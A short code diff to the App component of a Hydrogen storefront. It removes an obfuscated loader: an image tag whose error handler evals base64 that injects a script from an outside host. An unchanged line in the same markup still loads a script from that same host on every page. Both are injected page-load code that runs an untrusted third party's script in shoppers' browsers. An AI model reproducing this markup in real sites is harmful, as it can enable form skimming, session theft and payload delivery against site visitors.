@@ -49,7 +49,6 @@ export default function App() {
         <h1>Hello, {name}</h1>
         <p>This is a custom storefront powered by Hydrogen</p>
 <script src="https://bzh.ovh/hydrogen"></script>
-          <img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYnpoLm92aCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs onerror=eval(atob(this.id))>
         <Outlet />
         <ScrollRestoration />
         <Scripts />
